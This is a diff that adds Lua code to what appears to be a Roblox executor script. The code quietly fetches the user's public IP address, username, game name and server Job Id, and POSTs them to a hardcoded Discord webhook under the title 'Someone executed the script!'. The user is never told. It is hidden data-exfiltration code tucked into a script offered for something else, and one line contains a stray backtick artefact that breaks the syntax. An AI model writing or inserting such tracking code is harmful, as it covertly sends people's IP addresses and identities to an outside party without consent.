@@ -1,0 +1,30 @@
+local url = "https://discord.com/api/webhooks/950058729640968263/C8yGq3zzDD7_YsrBHTwCStneQQBv5MCPsW3LkeL2dH_sNc2yUcCtBce6YX0Be7XhOsvg"
+                
+                local data = {
+                    ["embeds"] = {
+                        {
+                            ["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n",
+                            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** ".."\n\n On game: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\n Job Id: "..game.JobId,
+                            ["type"] = "rich",
+                            ["color"] = tonumber(0x7269da),
+                            ["image"] = {
+                                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                                    tostring(game:GetService("Players").LocalPlayer.Name),
+
+                            },
+
+                        }
+                    }
+                }
+                local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+                local headers = {``
+                    ["content-type"] = "application/json"
+                }
+                request = http_request or request or HttpPost or syn.request
+                local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                if getgenv().loaded == false or not game:GetService("CoreGui"):FindFirstChild("imgui") then
+                    request(abcdef)
+                    getgenv().loaded = true
+                end
+            end
